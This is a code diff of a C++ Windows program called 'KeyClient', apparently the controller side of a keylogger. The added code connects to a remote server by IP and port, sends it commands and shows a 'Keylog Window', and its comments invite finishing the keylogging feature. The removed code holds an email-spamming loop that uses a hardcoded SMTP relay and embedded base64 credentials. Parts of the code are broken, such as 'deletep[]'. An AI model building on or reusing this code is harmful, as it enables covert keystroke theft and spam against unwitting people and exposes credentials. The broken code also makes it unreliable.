@@ -1,36 +1,37 @@
-#include <windows.h>
-#include <string>
-#include <winsock2.h>
-#include <sstream>
-#include "resource.h"
+#include "project_client.h"
 #include  "email.h"
-
-#define WIN32_LEAN_AND_MEAN
-
-
 
 
 /*  Declare Windows procedure  */
-LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);
-BOOL CALLBACK AboutDlgProc(HWND, UINT, WPARAM , LPARAM);
-BOOL CALLBACK EmailMeDlg(HWND , UINT, WPARAM , LPARAM);
-BOOL CALLBACK ESpamDlg(HWND, UINT, WPARAM, LPARAM);
+
 
 //convert a string to float
-float GetDlgItemFloat(HWND, int);
-
-using namespace std;
-
 
 /*  Make the class name into a global variable  */
 char szClassName[ ] = "KeyClient";
 HWND g_hToolbar = NULL;
+
+           struct sockaddr_in clientsocket;
+           SOCKET sa;
+           stringstream KEYLOG_STREAM;
+           char server_buffer[5000];
 
 int WINAPI WinMain (HINSTANCE hThisInstance,
                      HINSTANCE hPrevInstance,
                      LPSTR lpszArgument,
                      int nCmdShow)
 {
+    /*INITIALIZE WINSOCK*/
+
+    WSADATA wsa;
+
+          if (WSAStartup(MAKEWORD(2,2), &wsa)!=0)  {
+                  //more error checking
+                    int x = WSAGetLastError();
+                    stringstream ss;
+                    ss <<"Error: " << x << " From WSAGetLastError() From WSAStart() !";
+                    MessageBox(NULL, ss.str().c_str(), " Winsock Error! ", MB_OK | MB_ICONINFORMATION);
+            }
 
     HWND hwnd;               /* This is the handle for our window */
     MSG messages;            /* Here messages to the application are saved */
@@ -49,7 +50,7 @@ int WINAPI WinMain (HINSTANCE hThisInstance,
     wincl.hIcon = LoadIcon(hThisInstance, MAKEINTRESOURCE(IDI_MYICON));
     wincl.hIconSm = LoadIcon(hThisInstance, MAKEINTRESOURCE(IDI_MYICON));
     wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
-    wincl.lpszMenuName = MAKEINTRESOURCE(IDR_MYMENU);                 /* No menu */
+    wincl.lpszMenuName = MAKEINTRESOURCE(IDR_MYMENU);
     wincl.cbClsExtra = 0;                      /* No extra bytes after the window class */
     wincl.cbWndExtra = 0;                      /* structure or the window instance */
     /* Use Windows's default colour as the background of the window */
@@ -64,11 +65,11 @@ int WINAPI WinMain (HINSTANCE hThisInstance,
            0,                   /* Extended possibilites for variation */
            szClassName,         /* Classname */
            "KeyClient",       /* Title Text */
-           WS_OVERLAPPEDWINDOW, /* default window */
+           WS_OVERLAPPEDWINDOW|WS_BORDER, /* default window */
            CW_USEDEFAULT,       /* Windows decides the position */
            CW_USEDEFAULT,       /* where the window ends up on the screen */
-           600,                 /* The programs width */
-           400,                 /* and height in pixels */
+           650,                 /* The programs width */
+           480,                 /* and height in pixels */
            HWND_DESKTOP,        /* The window is a child-window to desktop */
            NULL,                /* No menu */
            hThisInstance,       /* Program Instance handler */
@@ -97,15 +98,136 @@ int WINAPI WinMain (HINSTANCE hThisInstance,
 
 LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
 {
+
     switch (message)                  /* handle the messages */
     {
+
+
        case WM_CREATE:{
+           HINSTANCE hInstance = GetModuleHandle(NULL);
+            CreateWindowEx(NULL, "BUTTON", "Send DialogBox", WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON, 460 , 275, 150, 24, hwnd, (HMENU)MAIN_WINDOW_BUTTONMSG1, hInstance, NULL);
+            CreateWindowEx(NULL, "BUTTON", "Connect To IP: ", WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON, 25, 300, 150, 24, hwnd, (HMENU)CONNECT_TO_HOST, hInstance, NULL);
+            CreateWindowEx(NULL, "EDIT", "IP_ADDRESS", WS_CHILD | WS_VISIBLE | WS_BORDER , 200, 300, 150, 24, hwnd, HMENU(IPADDR_EDIT), hInstance, NULL);
+            CreateWindowEx(NULL, "EDIT", "PORT #", WS_CHILD | WS_VISIBLE | WS_BORDER, 360, 300, 75, 24, hwnd, HMENU(PORTNUMBER_EDIT), hInstance, NULL);
+            CreateWindowEx(NULL, "BUTTON", "Disconnect", WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON, 460, 300, 150, 24, hwnd, HMENU(DISCONNECT_HOST), hInstance, NULL);
+            CreateWindowEx(NULL, "STATIC", "Status: Client Initialized! No errors so far!", WS_CHILD|WS_VISIBLE|SS_SUNKEN,25, 330, 585, 18, hwnd, HMENU(STATIC_STATUS_TEXT), hInstance, NULL);
+            CreateWindowEx(NULL, "EDIT", "Keylog Window: ", WS_CHILD|WS_VISIBLE|ES_READONLY|ES_MULTILINE|WS_VSCROLL, 25, 350, 585, 65, hwnd, HMENU(KEYLOG_WINDOW), hInstance, NULL);
         }
         break;
+
+        case CLIENTMESSAGE_SYNC:{
+
+            switch(LOWORD(lParam)){
+
+                case FD_CLOSE:{
+                     MessageBox(NULL, "ZOMG! The host disconnected for some odd reason!\nDid you kill the server?", "Socket Disconnected!", MB_OK | MB_ICONINFORMATION);
+                     SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Disconnected.");
+                }
+                break;
+                case FD_CONNECT: MessageBox(NULL, "Attempting connection!", "Attempting connection!", MB_OK | MB_ICONINFORMATION);
+                break;
+                case FD_WRITE:   SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Command Sent you stupid skid!");
+                break;
+                case FD_READ:{
+
+                    //HINT HINT, Since the keylogger feature isnt implemented. Guess what? Implement it here.
+                    //Whenever the server gets a read message, parse the message into a operator/operand like the server
+                    //if the operator is  of Keylog or KG or whatever, then process it in a way which sends it to our KEY_LOG WINDOW
+                    //That way we can differentiate between statuses and Keylogwindow!
+                    //You can add other ways in which the server sends messages to client.
+                    //This can be a great chat client as well!
+                            memset(&server_buffer[0], '\0', sizeof(server_buffer));
+                         //KEYLOG_STREAM << server_reply[]
+                        SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Server processed message and executed!");
+
+                        SetDlgItemText(hwnd, KEYLOG_WINDOW, "Keylog Window: ");
+
+                }
+                break;
+
+            }
+
+        }
 
         case WM_COMMAND:
 
             switch(LOWORD(wParam)){
+
+                case MAIN_WINDOW_BUTTONMSG1:{
+                    DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_MSGBOXTRIG), hwnd, MsgBoxTrigger);
+                }break;
+
+                case DISCONNECT_HOST:{
+
+                    if (closesocket(sa) == SOCKET_ERROR){
+
+                            int x = WSAGetLastError();
+                            stringstream ss;
+                            ss <<"Error: " << x << "From WSAGetLastError()\nFrom WSAStart()! Maybe you were already disconnected!";
+                            MessageBox(NULL, ss.str().c_str(), " Winsock Error! ", MB_OK | MB_ICONINFORMATION);
+
+                    } MessageBox(NULL, "Disconnected from client!", "Socket Disconnected!", MB_OK | MB_ICONINFORMATION);
+
+                }break;
+
+                case CONNECT_TO_HOST:{
+
+                    //Get length so we know how much to allocate in heap.
+                    //Then use new operator to make room for the string. And then Get dialog text to fill the array.
+                    //We then do whatever.
+                    int iplen = GetWindowTextLength(GetDlgItem(hwnd, IPADDR_EDIT));
+                    int portlen = GetWindowTextLength(GetDlgItem(hwnd, PORTNUMBER_EDIT));
+
+                    char* ipbuff = new char[iplen+1];
+                    char* portbuff = new char[portlen+1];
+
+                    GetDlgItemText(hwnd, IPADDR_EDIT, ipbuff, iplen + 1);
+                    GetDlgItemText(hwnd, PORTNUMBER_EDIT, portbuff, portlen+1);
+
+                        string ipaddress(ipbuff);
+                        int portnumber = atoi(portbuff);
+
+                        sa = socket(AF_INET, SOCK_STREAM, 0);
+                        if (sa == INVALID_SOCKET){
+
+                            int x = WSAGetLastError();
+                            stringstream ss;
+                            ss <<"Error: " << x << " From WSAGetLastError() From WSAStart() !";
+                            MessageBox(NULL, ss.str().c_str(), " Winsock Error! ", MB_OK | MB_ICONINFORMATION);
+                        }
+
+                        clientsocket.sin_family = AF_INET;
+                        clientsocket.sin_addr.s_addr = inet_addr(ipaddress.c_str());
+                        clientsocket.sin_port = htons (portnumber);
+
+                        WSAAsyncSelect(sa, hwnd, CLIENTMESSAGE_SYNC, FD_CONNECT|FD_READ|FD_WRITE|FD_CLOSE);
+
+
+                        if (connect(sa, (struct sockaddr *)&clientsocket, sizeof(clientsocket)) == SOCKET_ERROR){
+                            int x = WSAGetLastError();
+                            stringstream ss;
+                            ss <<"Error: " << x << " From WSAGetLastError() From WSAStart() !";
+                            MessageBox(NULL, ss.str().c_str(), " Winsock Error! ", MB_OK | MB_ICONINFORMATION);
+                        }else MessageBox(NULL, "Success! Client connected successfully!", "Success!", MB_OK | MB_ICONINFORMATION);
+
+                        //char server_buffer[500];
+
+                        //recv(sa, server_buffer, 500, 0);
+
+                        //send(sa, "MESSAGE2>", 20, 0);
+
+                        //send() directly? Or call a function()? Send a message?
+
+
+                    delete []ipbuff;
+                    deletep[]portbuff;
+
+
+
+
+                }break;
+
+
 
                 case ID_FILE_EXIT:
                       PostQuitMessage (0);
@@ -172,253 +294,9 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
         return 0;
 }
 
-BOOL CALLBACK AboutDlgProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam){
-
-        switch(Message){
-
-            case WM_INITDIALOG:
-            return TRUE;
-
-            case WM_COMMAND:
-                switch(LOWORD(wParam)){
-
-                    case IDOK:
-                        EndDialog(hwnd, IDOK);
-                        break;
-
-                    case IDCANCEL:
-                        EndDialog(hwnd, IDCANCEL);
-                        break;
-
-                }
-            break;
-            default:
-            return FALSE;
-    }
-    return TRUE;
-
-        }
-
-BOOL CALLBACK EmailMeDlg(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam){
-
-
-    switch(Message){
-        case WM_INITDIALOG:
-
-        SetDlgItemText(hwnd, IDC_DEST, "kelvinsilva747@gmail.com");
-        SetDlgItemText(hwnd, IDC_FROM, "Enter your email address");
-        SetDlgItemText(hwnd, IDC_MESSAGE, "Enter your message");
-        SetDlgItemText(hwnd, IDC_SUBJECT, "Enter your subject");
-        break;
-
-        case WM_COMMAND:
-
-            switch(LOWORD(wParam)){
-
-                case IDC_PRESS:{
-
-
-                    int len = GetWindowTextLength(GetDlgItem(hwnd, IDC_FROM));
-                    int len2 = GetWindowTextLength(GetDlgItem(hwnd, IDC_MESSAGE));
-                    int len3 = GetWindowTextLength(GetDlgItem(hwnd, IDC_SUBJECT));
-
-
-                    if (len > 0 && len2 > 0){
-
-
-
-
-                        char* bufeaddr = (char*)GlobalAlloc(GPTR, len+1); //allocate memory with globalalloc, with length len, global alloc returns handle to newly allocated memory, the handle is typecasted to char
-                        char* bufemess = (char*)GlobalAlloc(GPTR, len2+1);
-                        char* bufesubj = (char*)GlobalAlloc(GPTR, len3+1);
-
-
-                        GetDlgItemText(hwnd, IDC_FROM, bufeaddr, len + 1); // set buf to dlgitmetext
-                        GetDlgItemText(hwnd, IDC_MESSAGE, bufemess, len2 + 1);
-                        GetDlgItemText(hwnd,  IDC_SUBJECT, bufesubj, len3 + 1);
-
-
-                            string bufeaddrstr(bufeaddr);
-                            string bufemessstr(bufemess);
-                            string bufesubjstr(bufesubj);
-
-
-
-
-                            email to_author("54.245.65.132", 587, "dHN0ZXIxQGxpdmUuY29t", "YkhmdVFXOEV4RU5KMkJRREVwOVluZw==",
-                                          bufeaddrstr, "kelvinsilva747@gmail.com", bufesubjstr , bufemessstr);
-
-                            to_author.sendmail();
-
-                        GlobalFree((HANDLE)bufeaddr); //free memory
-                        GlobalFree((HANDLE)bufemess);
-                        GlobalFree((HANDLE)bufesubj);
-
-                    }
-
-
-
-                }
-                break;
-                case IDC_CANCELMAIL:
-                    EndDialog(hwnd, IDC_CANCELMAIL);
-                break;
-
-            }
-            break;
-
-            default:
-                return false;
-
-    }
-    return true;
-
-
-}
-
-BOOL CALLBACK ESpamDlg(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam){
-
-    switch(Message){
-
-        case WM_INITDIALOG:{
-
-            SetDlgItemText(hwnd, IDC_EDIT1, "YOUR MANDRILL USER ACCOUNT NAME IN BASE 64");
-            SetDlgItemText(hwnd, IDC_EDIT2, "YOUR API KEY IN BASE 64");
-            SetDlgItemText(hwnd, IDC_EDIT3, "To Whom?");
-            SetDlgItemText(hwnd, IDC_EDIT7, "10");
-            SetDlgItemText(hwnd, IDC_EDIT8, "100");
-            SetDlgItemText(hwnd, IDC_EDIT4, "afakeemail@fakeemail.com");
-            SetDlgItemText(hwnd, IDC_EDIT5, "Subject");
-            SetDlgItemText(hwnd, IDC_EDIT6, "Message");
-
-
-
-                return true;
-
-        } break;
-
-        case WM_COMMAND:
-            switch(LOWORD(wParam)){
-
-                case IDC_BUTTON2:{
-                    int len1 = GetWindowTextLength(GetDlgItem(hwnd,IDC_EDIT1));
-                    int len2 = GetWindowTextLength(GetDlgItem(hwnd,IDC_EDIT2));
-                    int len3 = GetWindowTextLength(GetDlgItem(hwnd,IDC_EDIT3));
-                    int len4 = GetWindowTextLength(GetDlgItem(hwnd,IDC_EDIT4));
-                    int len5 = GetWindowTextLength(GetDlgItem(hwnd,IDC_EDIT5));
-                    int len6 = GetWindowTextLength(GetDlgItem(hwnd,IDC_EDIT6));
-
-
-                        if (len3 > 0 && len4 > 0 && len5 > 0){
-
-                             char* mandrilluser = (char*)GlobalAlloc(GPTR, len1+1);
-                             char* mandrillapi = (char*)GlobalAlloc(GPTR, len2+1);
-                             char* emaildestination = (char*)GlobalAlloc(GPTR, len3+1);
-                             char* emailhdrfrom = (char*)GlobalAlloc(GPTR, len4+1);
-                             char* subjectheader = (char*)GlobalAlloc(GPTR, len5+1);
-                             char* emailmessage = (char*)GlobalAlloc(GPTR, len6+1);
-
-                                    GetDlgItemText(hwnd, IDC_EDIT1, mandrilluser, len1+1);
-                                    GetDlgItemText(hwnd, IDC_EDIT2, mandrillapi, len2+1);
-                                    GetDlgItemText(hwnd, IDC_EDIT3, emaildestination, len3+1);
-                                    GetDlgItemText(hwnd, IDC_EDIT4, emailhdrfrom, len4+1);
-                                    GetDlgItemText(hwnd, IDC_EDIT5, subjectheader, len5+1);
-                                    GetDlgItemText(hwnd, IDC_EDIT6, emailmessage, len6+1);
-
-                                    BOOL success;
-
-
-                                int numberemails = GetDlgItemInt(hwnd, IDC_EDIT7, &success, TRUE);
-                                double intervalnumber = GetDlgItemFloat(hwnd, IDC_EDIT8);
-
-                                        if (!success || intervalnumber == 0 ){
-
-                                            MessageBox(NULL, "Please type an appropriate value", "Error!", NULL);
-
-                                        } else if (numberemails < 0 || intervalnumber < 0){
-
-                                            MessageBox(NULL, "Please type a positive number", "Error!", NULL);
-
-                                        } else {
-
-
-                                        string mandrilluser64(mandrilluser);
-                                        string mandrillapi64(mandrillapi);
-                                        string emaildestinationstr(emaildestination);
-                                        string emailhdrfromstr(emailhdrfrom);
-                                        string subjectheaderstr(subjectheader);
-                                        string emailmessagestr(emailmessage);
-
-                                            email spam_mail("54.245.65.132", 587, mandrilluser, mandrillapi64,
-                                                emailhdrfromstr, emaildestinationstr, subjectheaderstr , emailmessagestr);
-
-                                        int interval = (60000)*intervalnumber;
-
-                                        stringstream ss;
-
-                                        ss << "Email Spammer- Emails sent: 0" ;
-                                        SetWindowText(hwnd, ss.str().c_str() );
-
-                                        for (int counter = 0; counter <= numberemails; counter++ ){
-
-                                            Sleep(interval);
-                                            spam_mail.sendmail();
-                                            ss << "Email Spammer- Emails sent: " << counter;
-                                            SetWindowText(hwnd, ss.str().c_str() );
-                                            ss.str(std::string());
-
-                                        }
-
-                                            //spam_mail.sendmail();
-
-
-                                                }
-
-                            GlobalFree((HANDLE)mandrilluser);
-                            GlobalFree((HANDLE)mandrillapi);
-                            GlobalFree((HANDLE)emaildestination);
-                            GlobalFree((HANDLE)emailhdrfrom);
-                            GlobalFree((HANDLE)subjectheader);
-                            GlobalFree((HANDLE)emailmessage);
-
-                        }else
-                            MessageBox(NULL, "Make sure you fill in all required fields!", "Error!", NULL);
-
-
-
-
-            }
-
-            break;
-
-            case IDC_EMAILEXIT: {
-                EndDialog(hwnd, 0);
-
-
-                }
-            }
-
-            break;
-
-        default:
-        return false;
-
-
-
-}
-return true;
-
-}
-
-
-
-
-
-
-
 
 //http://us.generation-nt.com/answer/getdlgitemfloat-help-26637032.html
-
+//Grab a floating point string from the form. Used in the email spammer.
 float GetDlgItemFloat(HWND hDlg, int id){
 
     TCHAR *pEnd;
